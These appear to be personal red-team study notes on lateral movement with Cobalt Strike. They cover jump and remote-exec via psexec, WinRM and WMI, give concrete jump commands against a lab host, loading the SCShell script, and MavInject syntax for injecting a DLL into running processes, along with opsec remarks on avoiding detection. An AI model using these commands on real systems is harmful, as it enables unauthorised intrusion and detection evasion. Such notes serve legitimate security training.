jump <--opsec wise my beacon gets kiled in real world
- Uploading a payload to the target.
- Remotely executing that payload.
- Connecting to the new Beacon session (in the case of P2P).
- Deleting the payload from the target.

Beacon Remote Execute Methods
=============================
​
    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI

These can be useful for cases where the technique cannot be reliably integrated into the jump command.

Windows Remote Management (WinRM) <-- executes payload entirely in memory, does not need to be dropped to disk. 
- will run in current context of user or impersonated user.
- winrm is the only remote-exec that provides output, good for enumeration.
- jump winrm64 lon-ws-1 smb

PsExec <- beacons executed as psexec always run as SYSTEM, loud and bad on the opsec
- built in and performs injection by default. 
- jump psexec64 lon-ws-1 smb

SCShell <-- better opsec
C:\Tools\SCShell\CS-BOF\scshell.cna
Cobalt Strike > Script Manager

Adds a ne exploit

MavInject:
MavInject is a signed Microsoft executable that provides functionality for App-V to inject libraries into other process.  It lives in the System32/SysWOW64 directories on default Windows installations
- mavinject.exe [PID] /INJECTRUNNING [DLL PATH]
- remote-exec to list the running process on remote target
